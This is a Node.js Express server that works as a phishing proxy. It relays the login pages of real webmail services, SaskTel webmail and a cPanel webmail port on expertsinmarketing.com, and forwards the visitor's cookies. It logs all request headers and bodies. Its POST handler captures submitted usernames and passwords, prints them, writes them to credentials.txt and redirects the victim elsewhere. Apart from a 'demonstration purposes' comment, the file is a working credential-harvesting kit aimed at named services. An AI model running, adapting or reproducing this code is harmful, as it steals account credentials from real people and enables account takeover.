import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import fs from 'fs';
import { createProxyMiddleware } from 'http-proxy-middleware';

const app = express();
const PORT = 3001;

// Middleware to parse URL-encoded bodies (for form submissions) and JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Middleware to log all incoming requests with detailed information
app.use((req, res, next) => {
  console.log(`\n[${new Date().toISOString()}] Incoming ${req.method} request to ${req.url}`);
  console.log('Headers:', JSON.stringify(req.headers, null, 2));

  if (req.method === 'POST' || req.method === 'PUT') {
    console.log('Body:', JSON.stringify(req.body, null, 2));
  }

  next();
});

// Function to determine the target URL based on incoming request
function getTargetUrl(req) {
  const { host } = req.headers;

  if (host.includes('sasktel')) {
    return 'https://webmail.sasktel.net';
  } else if (host.includes('expertsinmarketing')) {
    return 'https://expertsinmarketing.com:2096';
  }
  
  // Default target if no specific match found
  return 'https://expertsinmarketing.com:2096';
}

// Route to render proxied content directly without using an iframe
app.get('/render', async (req, res) => {
  try {
    const targetUrl = getTargetUrl(req);
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': req.headers['user-agent'],
        'Accept': req.headers['accept'],
        'Accept-Language': req.headers['accept-language'],
        'Accept-Encoding': req.headers['accept-encoding'],
        'Cookie': req.headers.cookie || '',
      }
    });

    if (response.ok) {
      const content = await response.text();
      res.send(content);
    } else {
      res.status(response.status).send(`Error fetching content: ${response.statusText}`);
    }
  } catch (error) {
    console.error(`Error fetching proxied content: ${error.message}`);
    res.status(500).send('Internal Server Error');
  }
});

// Enhanced POST handler to capture login credentials
app.post('*', (req, res) => {
  const { user, pass } = req.body;

  if (user && pass) {
    // Log credentials to a file for demonstration purposes
    console.log(`Captured credentials: User: ${user}, Password: ${pass}`);
    fs.appendFileSync('credentials.txt', `User: ${user}, Password: ${pass}\n`);
    // Redirect to an external site
    res.redirect('https://www.example.com');
  } else {
    console.log('POST request received but no valid credentials found.');
    res.sendStatus(400); // Send a bad request status to indicate missing data
  }
});

// Start the HTTP server
app.listen(PORT, () => {
  console.log(`Proxy server running on http://localhost:${PORT}`);
});
